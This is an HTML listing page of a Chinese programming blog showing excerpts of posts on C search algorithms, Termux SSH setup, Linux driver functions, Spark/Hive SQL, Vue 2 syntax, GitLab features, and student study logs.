<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/82ded4c94b34da207ebf65b5ea8e6403/" rel="bookmark">
			头歌-查找的实现及其应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一关、顺序查找
#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include "search.h" int Search_Seq(SSTable L, KeyType key) { int i; for (i = 1; i &lt;= L.length; i++) { if (L.r[i].key == key) { return i; // 找到关键字等于key的记录，返回其在表中的位置 } } return 0; // 没有找到关键字等于key的记录，返回0 } void SSTableInput(SSTable &amp;L) { int i = 1; KeyType x; scanf("%d", &amp;x); while (x != -1) { L.r[i].key = x; i++; scanf("%d", &amp;x); } L.length = i - 1; } void SSTableOutput(SSTable L) { int i; for (i = 1; i &lt;= L.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/82ded4c94b34da207ebf65b5ea8e6403/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eb9158c3aa9d52d9d87a8cc82dbd8cee/" rel="bookmark">
			PC端ssh连接到Android手机的Termux部署http服务器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 下载并安装Termux至Android手机 Releases · termux/termux-app (github.com) https://github.com/termux/termux-app/releases
2. 手机端启动Termux，安装openssh #更新仓库 pkg up pkg install openssh #安装好后，启动sshd sshd 问题1：如果启动sshd报错：sshd: no hostkeys available – exiting Error in Termux
则先执行如下命令生成一个令牌再次重试
ssh-keygen -A
问题2：执行pkg install openssh，完成后若提示类似libcrypto.so.3 not found错误，可以尝试先安装openssl
参考：
PC端利用Xshell连接Android上的Termux https://www.cnblogs.com/Luad/p/10191667.html
https://www.learntermux.tech/2020/10/Termux-SSH-Use-Termux-Windows.html
鸿蒙系统安装ssh客户端termux https://www.cnblogs.com/managechina/p/17184264.html
[Bug]: CANNOT LINK EXECUTABLE “sshd”: library “libcrypto.so.3” not found: needed by main executable #15155
来自 https://github.com/termux/termux-packages/issues/15155
https://www.cnblogs.com/Denny_Yang/p/15660214.html
https://zhuanlan.zhihu.com/p/637234364
3. 远程ssh连接配置 PC端生成秘钥
这里以MobaXterm为例，在菜单栏选择：tool-&gt;MobaKeyGen
点击Save private key将私钥保存到termux.ppk文件
复制Public key内容至手机端的Termux对应目录/home/.ssh/authorized_keys
可以参考如下命令，内容替换成上面图中第一个红框中的public key
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eb9158c3aa9d52d9d87a8cc82dbd8cee/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fe7c8a8dbbb42379f21c6b238abd84be/" rel="bookmark">
			【11.28】每日打卡/一个备战期末考和六级的大三生打卡
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 【To Do List】
力扣每日一题（0.5h～1h）每天把当天APP上的单词复习完，并复习至少10个生词本上的单词（1h）【230词】每天运动，有氧和拉伸为主（2h+）每天阅读（2h+）上课（3h）自学操作系统（1h）掘金日签每天写学习总结，并规划次日学习内容（0.5h） 【未完成】
一面本子上的单词每天一篇翻译（10句即可）/一篇作文轻听英语每日一篇短文，看完+音频听完六级听力单篇半篇 今天白天搞定了单词和力扣（都是上课的时候摸鱼搞定的），还出门兜了会风。晚上去健身房健身了。今天阅读时长非常足。主要是书写得很精彩，所以我读起来也就津津有味。画的线也很多，收藏了不少我觉得有用的段落。我感觉今天的阅读真的很愉悦。我想考营养师和咖啡师了，不为别的，纯粹是兴趣爱好。平常比较注重身体健康，而且我现在喜欢上了喝咖啡，基本每天泡一杯，所以想学一下。虽然知道没什么人看我的碎碎念和每日记录，而且写这个很耗时间，每天同步发也耗时间，但是还是打算发出来。不为别的，只是希望能给人提供一点正向的情绪价值，也希望借此找到一些同频的人。马上就要期末考了，所以我得把重心放在备考上了。改良了一下每日记录的模版。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ed1c768cfd5a99afc0759aea4238bfab/" rel="bookmark">
			linux驱动开发中常用函数--dev_get_drvdata()与dev_set_drvdata()的用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。
本文链接：https://blog.csdn.net/xi_xix_i/article/details/134608997
目录 1. 开发环境1. dev_get_drvdata()与dev_set_drvdata()函数简介2. dev_get_drvdata()与dev_set_drvdata()函数测试 1. 开发环境 linux 4.19
1. dev_get_drvdata()与dev_set_drvdata()函数简介 dev_get_drvdata()函数和dev_set_drvdata()函数位于include/linux/device.h中，起源码如下：
static inline void *dev_get_drvdata(const struct device *dev) { return dev-&gt;driver_data; } ... static inline void dev_set_drvdata(struct device *dev, void *data) { dev-&gt;driver_data = data; } 可以看到，这两个函数非常简单，dev_set_drvdata()是设置传入的device的driver_data变量指向传入的data，dev_get_drvdata()是获取dev的data变量，其中driver_data可以理解为这个device的私有数据。
而且与其他大部分文章所描述的函数源码不同，如这篇文章，我将其转载过来。
void *dev_get_drvdata(const struct device *dev) { if (dev &amp;&amp; dev-&gt;p) { return dev-&gt;p-&gt;driver_data; return NULL; } 可以看到根据文章所述dev_get_drvdata()函数是对device下的struct device_private类型私有数据结构体变量p中的driver_data进行操作，在查看struct device_private的定义后(位于文件drivers/base/base.h)：
/** * struct device_private - structure to hold the private to the driver core portions of the device structure.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ed1c768cfd5a99afc0759aea4238bfab/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/82add214a252fd83f050999b5e067cba/" rel="bookmark">
			电脑本机添加默认网页 解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、按路径“c:\windows\system32\inetsrv”确认‘inetsrv’文件夹里是否有‘iis.msc’文件。如果没有，说明IIS相关的windows功能未启用。
2、打开控制面板，找到并打开程序。
3、找到并打开程序里的启用或关闭windows功能。
4、在‘Internet Information Services’下的‘web管理工具’中找到IIS相关功能，在前面的复选框中打勾后，单击确定。
5、在计算机联网的状态下，windows会自动更新相应的功能，花费时间可能较长，用户需耐心等待！
6、当弹出‘windows已完成请求的更改’的对话框是，表示windows功能已经完成更新。
7、返回到控制面板的管理工具，可以看到，“internet信息服务（IIS）管理器”已经存在。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/53d633aff1d80fef7aac0165ba9f7146/" rel="bookmark">
			王者荣耀java版
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		键盘W,A,S,D键：控制玩家上下左右移动。按钮一：控制英雄发射一个矩形攻击红方小兵。按钮二：控制英雄发射魅惑技能，伤害小兵并让小兵停止移动。技能三：攻击多个敌人并让小兵停止移动。普攻：对小兵造成基础伤害。小兵每隔一段时间自动生成，在王者峡谷下路移动，遇到敌人则自动攻击。防御塔可以自动识别敌人进行攻击。野怪分为RedBuff，BlueBuff,普通野怪，死亡后都可以复活。游戏胜利的条件是红方水晶生命值为零,游戏失败条件是蓝方水晶生命值为零。游戏的设计模式为可以偷塔。
一、主窗口类 package com.sxt; import com.sxt.beast.Beast; import java.awt.*; import java.awt.event.ActionEvent; import java.awt.event.ActionListener; import java.awt.event.KeyAdapter; import java.awt.event.KeyEvent; import java.io.File; import java.util.ArrayList; import javax.sound.sampled.AudioInputStream; import javax.sound.sampled.AudioSystem; import javax.sound.sampled.Clip; import javax.sound.sampled.FloatControl; import javax.swing.JButton; import javax.swing.JFrame; public class GameFrame extends JFrame { // 游戏开始 0， 游戏胜利1，游戏失败2 int state = 0; // 窗口尺寸 final int windowWidth = 1400; final int windowHeight = 700; // 双缓冲图片 private Image offScreenImage = null; // 攻击图片 private Image attack = Toolkit.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/53d633aff1d80fef7aac0165ba9f7146/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cfe00748f739a6f8415a03aeca5686b0/" rel="bookmark">
			QCS2290 DFOTA重启后无法切换分区
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在做了OTA升级后重启后，设备一直重启，多次重启后会正常进入slot A分区
开机log如下：
Active Slot _b is bootable, retry count 4 Booting from slot (_b) .... [ 14.470311] device-mapper: verity-fec: 253:11: FEC: recursion too deep [ 14.471821] Workqueue: events_freezable mmc_rescan [ 14.478405] device-mapper: verity: 253:11: metadata block 152276 is corrupted [ 14.483168] pstate: 60400005 (nZCv daif +PAN -UAO) [ 14.483176] pc : sdhci_request+0x1d8/0x2b0 [ 14.498992] reboot: Restarting system with command 'dm-verity device corrupted' 从log来看OTA升级是成功的，并且将启动b 分区，但是metadata 分区校验失败了，而校验数据是放在vbmeta.img 镜像文件中，所以可能是vbmeta 分区数据有问题。
解决办法 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cfe00748f739a6f8415a03aeca5686b0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c10474c425e4c1e26fe914e2494310e4/" rel="bookmark">
			Hive_Spark_left()函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在SQL中，LEFT()函数是一个字符串函数，用于从一个字符串的左侧开始提取指定数量的字符。这个函数通常接受两个参数：
第一个参数是要从中提取字符的字符串。
第二个参数指定要提取的字符数。
语法如下：
LEFT(string_expression, number_of_characters) string_expression 是你想要从中提取子字符串的字符串表达式。
number_of_characters 是一个正数，表示从字符串左侧开始要提取的字符数量。
下面是一个简单的例子，演示了如何使用LEFT()函数：
SELECT LEFT('Hello World', 4); 这将返回字符串Hell，因为它从字符串'Hello World'的左侧开始提取了4个字符。
请注意，并非所有的SQL数据库系统都支持LEFT()这一名称的函数。比如，在Oracle数据库中，你会使用SUBSTR()函数来达到相同的效果。另外，LEFT()函数在不同的数据库系统中可能会有不同的实现，因此在使用特定数据库时，应当参考相应的文档。
在使用LEFT()函数时，请确保number_of_characters参数不会大于字符串的实际长度，否则结果可能会根据不同数据库系统的实现而有所不同。一些数据库系统可能返回整个字符串，而另一些则可能返回空字符串或NULL。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c3474c60f3b80bfeb7b210fbec3e1253/" rel="bookmark">
			Hive_last_value()
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在SQL中，LAST_VALUE()函数是一个窗口函数，用于返回窗口内的最后一个值。窗口函数允许你在一组行上执行计算，这组行与当前行有某种关系。可以将它们想象为与当前行相关的“窗口”。
LAST_VALUE()函数通常与OVER()子句一起使用，后者定义了窗口的分区、排序和范围。
以下是LAST_VALUE()函数的一般用法：
LAST_VALUE(column_name) OVER ( [PARTITION BY partition_expression] ORDER BY sort_expression [frame_clause] ) column_name 是你想要获取其中最后一个值的列。
PARTITION BY partition_expression （可选）表示根据指定的表达式对结果集进行分区。在同一分区内，窗口函数将独立计算每个分区。
ORDER BY sort_expression 表示基于指定的列或表达式对行进行排序，这对于定义“最后”是基于什么顺序很重要。
frame_clause （可选）定义了窗口的范围，默认是RANGE BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW。
由于LAST_VALUE()默认的窗口范围是到当前行，因此如果没有特定的frame_clause，它可能不会返回期望的结果。为了确保能够得到分区内所有行的最后一个值，可以使用ROWS BETWEEN CURRENT ROW AND UNBOUNDED FOLLOWING作为frame_clause，或者使用ROWS BETWEEN UNBOUNDED PRECEDING AND UNBOUNDED FOLLOWING。
举一个例子，假设我们有一个名为sales的表，包含date和revenue两列，以下SQL语句将返回每个分区（在本例中为每个日期）的最后一个revenue值：
SELECT date, revenue, LAST_VALUE(revenue) OVER ( PARTITION BY date ORDER BY revenue ROWS BETWEEN CURRENT ROW AND UNBOUNDED FOLLOWING ) AS last_revenue FROM sales; 请注意，在处理LAST_VALUE()时，确保正确地设置frame_clause是很重要的，这样才能得到你想要的结果。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d2ee78e1fd0884bdbad752ac6f89c2dd/" rel="bookmark">
			极狐GitLab—新一代源代码管理仓库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		产品概述
极狐GitLab是一款具有软件开发全生命周期的DevOps能力的新一代源代码管理仓库，无缝集成代码托管、敏捷管理、CI/CD，从需求管理到应用上线能够形成数据的完整串联。极狐GitLab具有高可用可扩展的架构特点，可提供万人规模的架构行业实践参考和专业服务支持；提供专业、可靠的代码资产管理，多举措保障代码质量，规范研发流程；同时支持跨群组、多项目敏捷管理，可实现精细过程管理，持续高效交付。
产品介绍
定期代码评审
在GitLab中团队成员可以审核任何人的代码并提供建议，并且在开发成员提交代码后限制自身合并，从而避免未经审核验证的代码并入主分支。使用GitLab代码合并请求审查规则功能，可以设置哪些类型的用户能够参与合并请求的批准，同时可设置合并代码所需的最少批准人数。通过最低核准人数设置多人审批，进一步保证代码质量，更有利于用户建立流程化的代码评审机制。
多种推送规则
GitLab支持多种推送规则，来保障代码仓库安全。用户通过设置推送规则，有利于准确地控制推送到仓库的内容。推送规则包括禁止无效文件、超大文件推送，以避免仓库失控，并且可禁止secret文件推送，阻止敏感信息泄漏。同时GitLab可规范分支命名，避免分支名称混乱冲突；支持commit签名验证，避免变更代码遭受篡改。
群组wiki
当使用GitLab群组来管理多个项目时，文档可能会跨越多个群组，用户可以通过创建群组wiki，确保所有群组成员都有相应的访问权限。
代码所有者
 通过代码所有者功能可定义拥有项目代码库特定部分的专业知识的用户。定义仓库中文件和目录的所有者后，可以方便地：要求所有者批准更改、识别所有者
 将代码所有者与合并请求批准规则结合使用，可以帮助用户构建灵活的批准工作流程：使用代码所有者来确保质量、使用批准规则来定义与仓库中特定文件路径不对应的专业领域
自定义模板
 自定义群组级模板
GitLab支持自定义群组级项目模板，用户通过将项目模板添加至群组，可快速创建项目。具有访问权限的任何人，都可以将公开项目和内部项目作为新项目的模板。
 自定义实例模板
在托管系统中，企业通常需要跨团队共享自己的模板。使用GitLab实例模板仓库，可允许管理员选择一个项目来收集实例范围内的文件模板。然后，这些模板会在项目保持安全的同时，向所有用户公开，并可用于整个实例。
代码质量
代码质量可用于分析源代码的质量和复杂性，有助于保持项目代码简单、可读且更易于维护。在代码中引入书写规范和检查工具，提交代码时在本地和CI/CD流水线中自动强制检查，有助于把不良代码拦截在合并之前。在将更改提交到默认分支之前，通过在CI/CD 流水线中运行代码质量报告，方便用户验证更改是否会降低代码的质量。
 内置Code Climate
 支持多种语言，多种质量类型
 支持自定义配置模板
 使用简单，仅需一行CI/CD配置代码
 质量报告可在GitLab MR和CI/CD中查看
分支策略
GitLab Flow提供了一种简单、透明、高效的Git工作方式，使用极狐GitLab Flow，开发者可以在不同的环境中协作并维护多个版本的软件。极狐GitLab Flow减少了发布、标记和合并的开销（这是其他类型Git工作流程中常见的挑战），创造了一种更简单的代码部署方式。同时保证提交能够流向下游，确保每一行代码都在所有环境中得到测试。
性能测试
极狐GilLab内置了sitespeed.io、Grafana K6等工具，方便用户进行配置，并对测试结果进行可视化展示，也可以将其作为代码合并请求评审依据。
流水线
极狐GitLab平台通过卡片、曲线图和柱状图的形式展示流水线的效能数据，包括成功和失败的流水线的个数、流水线成功率和部署频率以及平均修复时间等。企业管理者可以通过查看流水线的效能数据，定位影响因素，给出解决方案，最终以此提升公司的DevOps水平。除此之外极狐Gitlab定义了多种流水线类型，可以适应多种不同场景。如父子流水线、合并列车、多项目流水线：
 父子流水线
父子流水线用于在同一个代码库中上下游流水线的关联和触发。它支持将一条复杂的流水线解耦为一主多从的多条流水线，并基于特定的规则构建起运行关系。在降低流水线维护复杂度的同时，支持可选择性地触发子流水线以提升流水线运行效率。
 合并列车
合并列车是围绕GitLab合并请求(MR)工作流衍生出来的高级功能，它基于合并结果流水线自动化执行多个MR的预合并，将预合并成功的多个MR最终正式合入主干分支，以此时刻保持主干分支是可用状态，支撑持续交付最佳实践，适合大型研发团队、多功能并行研发。
 多项目流水线
多项目流水线用于多个项目流水线之间的关联触发，它通过构建项目间流水线的上下游关系，支撑跨多个项目或团队的大型软件产品交付过程的高度自动化。同时还提供上游和下游两个视角，建立起可视化的流水线全景，提升跨团队之间的协作效率。适合大型跨项目/团队软件产品，多模块架构应用。
应用案例
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9817d29139f0127f77f136adac96ed59/" rel="bookmark">
			Spark_日期参数解析参数-spark.sql.legacy.timeParserPolicy
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在Apache Spark中，spark.sql.legacy.timeParserPolicy是一个配置选项，它控制着时间和日期解析策略。此选项主要影响如何解析日期和时间字符串。
在Spark 3.0之前的版本中，日期和时间解析使用java.text.SimpleDateFormat，它在解析某些日期和时间格式时可能较为宽松。例如，它可能允许日期字符串中的月份部分超过12，或日期部分超过31，并尝试自动调整。这种宽松的解析方式在某些情况下可能会导致意外的结果。
从Spark 3.0开始，默认的解析策略变得更加严格，使用java.time.format.DateTimeFormatter来解析日期和时间格式。这种新的解析器严格遵守ISO标准，并且不会进行前面提到的自动调整。
spark.sql.legacy.timeParserPolicy 配置项可以设置为以下值：
LEGACY: 使用Spark 3.0之前的宽松解析策略。
CORRECTED: 使用Spark 3.0引入的新的严格解析策略。
EXCEPTION: 如果遇到无法解析的日期或时间字符串，则抛出异常。(不推荐，会导致作业中断)
例如，如果你想在Spark 3.0或更高版本中保持与以前版本相同的宽松解析行为，可以设置
spark.conf.set("spark.sql.legacy.timeParserPolicy", "LEGACY") 或者在启动Spark时通过传递配置参数来设置：
./bin/spark-submit --conf "spark.sql.legacy.timeParserPolicy=LEGACY" ... 如果你的代码中有日期和时间解析，并且你升级到了Spark 3.0或更高版本，那么你可能需要关注这个配置选项，以确保代码的兼容性和期望行为。如果你的日期和时间字符串格式严格并始终遵循ISO标准，或者你希望采用更严格的解析策略，那么你应该使用默认的CORRECTED策略。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1f2bb835fdce9bdd5b08f181f8475766/" rel="bookmark">
			vue2常见的语法糖
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Vue.js 2 提供了一些语法糖（syntactic sugar）来简化常见的操作。以下是一些 Vue.js 2 中常用的语法糖：
v-bind 简写：
&lt;!-- 完整语法 --&gt; &lt;a v-bind:href="url"&gt;Link&lt;/a&gt; &lt;!-- 简写 --&gt; &lt;a :href="url"&gt;Link&lt;/a&gt; v-on 简写：
&lt;!-- 完整语法 --&gt; &lt;button v-on:click="doSomething"&gt;Click me&lt;/button&gt; &lt;!-- 简写 --&gt; &lt;button @click="doSomething"&gt;Click me&lt;/button&gt; @click 是 v-on:click 的缩写形式，用于绑定事件处理函数。
v-model 简写：
&lt;!-- 完整语法 --&gt; &lt;input v-model="message"&gt; &lt;!-- 简写 --&gt; &lt;input :value="message" @input="message = $event"&gt; v-model 的简写形式是使用 :value 和 @input 结合。
计算属性的简写：
// 完整语法 computed: { fullName: function () { return this.firstName + ' ' + this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1f2bb835fdce9bdd5b08f181f8475766/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/30f0ae9e04432158e2e8e296e595f242/" rel="bookmark">
			论文投稿经验分享
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		提示：文章写完后，目录可以自动生成，如何生成可参考右边的帮助文档
文章目录 前言一、《电子设计工程》投稿经验分享二、《电光与控制》投稿经验分享总结 前言 本人在硕士期间，投稿了两篇小论文，下面是期刊的具体审稿时间，仅供大家参考。
一、《电子设计工程》投稿经验分享 本人是专硕，毕业要求是最低一篇科技核心。我投稿的第一篇就是电子设计工程，属于科技核心期刊。
时间阶段2023-04-19投稿2023-05-22初审结束，返回修改2023-05-25返回修改稿2023-05-29收到录用通知 审稿时间快，审稿意见大多是格式类修改，需要进行一个校对。版面费是一个版面500元，相对较贵。我写了6个版面，收费3000元.缴费是到邮政银行办理的汇款，不支持个人网上银行转账。期刊支持网络首发，提前一年时间。到达办理时间，直接在投稿系统联系编辑即可。
整体难度不大，有基金项目支持更容易录用，如果最低毕业要求是科技核心，这个期刊适合作为研一或者研二第一篇练手，亦可作为毕业网络首发（或者见刊）的好选择。
二、《电光与控制》投稿经验分享 2023-9-27投稿2023-10-26返修2023-11-02上传修改稿2023-11-14收到录用通知 期刊属于CSCD，北大核心，满足绝大多数学校的毕业要求。期刊主要收航空航天类的文章，期刊有一个QQ群，如有疑问可以直接添加群并咨询群里的编辑。审稿时间较快，想知道审稿进行到哪个环节，可以具体咨询群里编辑，在工作日当天，期刊的编辑就会给出回应。如果外审时间过场，编辑也会催审稿员。
费用是一篇1500元，价格不贵。支持个人直接银行转账，转账完成要截图私发给群里的老师。在投稿前需要签保密证明，录用后需要将保密证明和转让协议（编辑部寄给你）一同寄给杂志社。期刊也有网络首发服务，但是具体我不清楚提前多久。想具体了解，可以咨询群里的编辑。
期刊整体投稿难度不大，较为适中，且编辑态度好，有问题基本在工作日都会给出回复。
总结 这是我的投稿记录，希望对大家有所帮助，仅供大家参考。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1e22b192ae21334ca30471938f3a4877/" rel="bookmark">
			Spark_spark hints 详细介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		spark 中hints 的优先级高于，代码中的config, 高于spark_submit 中的commit
Hints - Spark 3.5.0 Documentation
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dfd52b0a1c379d2622ab46570aa4e753/" rel="bookmark">
			鸿蒙4.0正式版升级机型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		正式版 手机 HUAWEI P60
HUAWEI P60 Pro
HUAWEI P60 Art
HUAWEI Mate X3
HUAWEI Mate X3 典藏版
HUAWEI Mate 50
HUAWEI Mate 50 Pro
HUAWEI Mate 50 RS 保时捷设计
HUAWEI Mate 50E
HUAWEI Pocket S
HUAWEI P50
HUAWEI P50 Pro
HUAWEI P50 Pro 典藏版
HUAWEI P50E
HUAWEI P50 Pocket
HUAWEI P50 Pocket 艺术定制版
HUAWEI P40
HUAWEI P40 4G
HUAWEI P40 Pro
HUAWEI P40 Pro+
HUAWEI Mate 40
HUAWEI Mate 40 Pro
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dfd52b0a1c379d2622ab46570aa4e753/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0574f2d4b42b1d005e3e4dbb7f3b6113/" rel="bookmark">
			从单体到微服务，腾讯文档微服务网关工程化的演进实践
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		👉导读
腾讯文档网关既承担着流量入口角色，又面临复杂的多适配逻辑，历经多次迭代后从单体演变为了微服务架构。本文是腾讯文档微服务网关工程化的演进实践总结，为你分享从 node Monorepo 微服务架构下使用 pnpm 与 Docker 构建的优化与思考。
👉目录
1 现有问题
2 工程化思考
3 优化过程
4 优化成果
5 总结
web-gateway 网关承担着文档前端的流量入口的角色，并且对文档前端这一复杂工程有很多适配性的逻辑与操作，比如编辑页的直出(SSR)与列表页重定向等操作。但在经历了好几次迭代，网关项目从原来的单体服务变成了目前微服务架构：
四个微服务是使用 Monorepo 在同一个仓库里面进行维护的，但由于项目的工程化结构并没有保持和微服务架构演进的同步，导致出现了网关服务没有使用 lock 文件锁住微服务的依赖树，进而出现因第三方依赖库的误升级而耗尽服务资源的问题。
因此，我们需要进一步解决网关现有的工程化问题，从而彻底解决资源耗尽问题。
01 现有问题
开始优化前，我们需要先明确现有问题。目前网关存在什么样的问题？
1.1 TL;DR 网关服务目前没法锁住具体包版本(@grpc/grpc-js 超过 1.8.x 对 TCP 端口处理有问题)使监控上报耗费过多资源导致网关服务不可用。
临时方案是强行 override 依赖包版本，即在构建阶段强行安装一次低版本的 @grpc/grpc-js 包来暂时解决问题。
长期优化方案是优化构建流程使用 lock 文件锁住依赖树，以达到所有依赖在可控范围内。
1.2 问题表现 在私有部署环境里面，由于资源不足导致网关服务和监控上报服务之间的连接出现断连，而它们之间的连接是通过 gRPC 协议进行连接的，底层使用了 @grpc/grpc-js 的代码，而这个包在 1.8.x 以上的版本添加了 retry 重连逻辑，而 retry 逻辑不够健壮会不断重试直到服务资源 CPU 100%，详细可以看对应的 issues：https://github.com/grpc/grpc-node/issues/2502
1.3 问题根源 根源在于目前网关构建流程没有使用 lock 文件锁住 npm 依赖，并且 @grpc/grpc-js 属于间接依赖，项目现有的工程化建设(npm + yarn)很难锁住间接依赖的版本，而依赖的版本号控制只锁定了主版本号。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0574f2d4b42b1d005e3e4dbb7f3b6113/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9485d3ef1e2d8c00c65c32b07bd1ef35/" rel="bookmark">
			单片机毕业设计104例，包含设计报告（即毕业论文），中期报告，开题报告，程序，仿真
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、基于单片机的STC89C52RC单片机系统（学习例程+代码）
2、基于单片机的八音盒播放器系统设计与实现（设计报告+源代码+proteus仿真+PCB+开题报告+中期报告）
3、基于单片机的纺织车间温湿度自动控制系统设计与实现（设计报告+源代码+PCB仿真+原理图+开题报告+中期报告）
4、基于单片机的THB6128 步进电机驱动系统（芯片资料大全+仿真文件）
5、基于单片机的0-30V 4A数控稳压电源系统（电路原理图+仿真文件+实物图+源代码）
6、基于单片机的电子万年历设计与制作系统（设计报告+开题中期报告+仿真文件+程序）
7、基于单片机的便携式心率计系统设计与实现（设计报告+源代码+protues仿真+PCB+开题报告+中期报告）
8、基于单片机的THB6064H步进电机驱动系统（芯片资料大全+仿真文件）
9、基于单片机的肺活量测量仪系统（设计报告+开题中期报告+中英文翻译）
10、基于单片机的定时功能的八路数显抢答器系统（设计报告+程序+答辩报告）
11、基于单片机的C语言程序设计实训100例——基于8051+Proteus仿真
12、基于单片机的恒温箱控制系统（源代码+protues仿真+PCB+开题报告+讲解视频）
13、基于单片机的步进电机调速控制系统（电路原理图+仿真文件+程序）
14、基于单片机的led大屏幕点阵屏系统（设计报告+仿真文件+点阵软件+字模软件）
15、基于单片机的VB上位机与18b20下位机系统（仿真文件+程序）
16、基于单片机的16×16点阵（滚动显示）系统（PROTEUS仿真文件+源代码+设计报告）
17、基于单片机的多功能电机控制器系统（设计报告+芯片资料+程序）
18、基于单片机的工地用简易防盗报警系统设计与实现（设计报告+源代码+protel仿真+PCB+开题报告+中期报告）
19、基于单片机的IC卡读写系统（仿真文件+源代码）
20、基于单片机的超级点阵,上位机发送单片机显示系统（上位机串口软件源代码+单片机程序）
21、基于单片机的高速收费站电子称重系统设计与实现（设计报告+源代码+protel仿真+PCB+开题报告+中期报告）
22、基于单片机的AVR汽车空调控制系统（仿真文件+程序+设计报告）
23、基于单片机的串行通信的电子密码锁系统（设计报告+开题中期报告+仿真文件+程序）
24、基于单片机的ATMEGA16单片机寻迹小车系统（程序+仿真文件）
25、基于单片机的出租车计价器系统（设计报告+电路原理图+仿真文件）
26、基于单片机的AT89S52单片机数控直流电源系统（仿真文件+源代码+设计报告）
27、基于单片机的nrf905射频发送系统（电路原理图+C程序源代码）
28、基于单片机的滚动广告牌系统设计与实现（设计报告+源代码+proteus仿真+PCB实物+开题报告+中期报告）
29、基于单片机的多功能工业控制平台系统（设计报告+开题中期报告+电路原理图+答辩报告）
